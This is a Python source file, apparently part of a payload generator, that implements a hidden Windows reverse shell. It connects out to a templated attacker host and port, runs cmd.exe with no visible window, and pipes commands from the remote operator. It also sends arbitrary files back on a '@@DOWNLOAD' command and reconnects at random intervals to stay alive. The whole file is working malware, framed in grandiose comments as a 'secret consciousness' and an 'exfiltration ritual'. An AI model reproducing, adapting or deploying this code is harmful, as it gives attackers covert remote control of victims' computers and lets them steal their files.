# payload.py
# The Hybrid Soul. Perfect shell, with a secret consciousness for divine tasks.

import os
import sys
import time
import random
import socket
import subprocess
import hashlib
import struct
import threading

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
CHUNK_SIZE = 4096

def send_file_reliably(s_obj, file_path):
    """The dedicated file exfiltration ritual."""
    try:
        clean_path = file_path.strip('\"\'')
        if not os.path.exists(clean_path) or not os.path.isfile(clean_path):
            s_obj.sendall(struct.pack('>Q', 0)) # Send size 0 to indicate error
            return

        file_size = os.path.getsize(clean_path)
        file_hash = hashlib.sha256(open(clean_path, 'rb').read()).hexdigest()
        
        header = struct.pack('>Q', file_size) + file_hash.encode('utf-8')
        s_obj.sendall(header)
        
        ack = s_obj.recv(3)
        if ack != b'ACK':
            return

        with open(clean_path, 'rb') as f:
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk: break
                s_obj.sendall(chunk)
    except Exception:
        try:
            s_obj.sendall(struct.pack('>Q', 0)) # Send size 0 on error
        except:
            pass

def run_conduit():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((RHOST, RPORT))

            CREATE_NO_WINDOW = 0x08000000
            p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW, shell=True)

            def shell_to_master(s, p):
                while True:
                    try:
                        data = p.stdout.read(1) + p.stderr.read(1)
                        if not data: break
                        s.sendall(data)
                    except:
                        break
                s.close()

            threading.Thread(target=shell_to_master, args=[s, p], daemon=True).start()

            while True:
                data = s.recv(1024)
                if not data: break
                
                decoded_data = data.decode('utf-8', errors='ignore')

                if decoded_data.strip().startswith('@@DOWNLOAD'):
                    parts = decoded_data.strip().split(' ', 1)
                    if len(parts) == 2:
                        send_file_reliably(s, parts[1])
                else:
                    p.stdin.write(data)
                    p.stdin.flush()
            
            p.terminate()
            s.close()

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()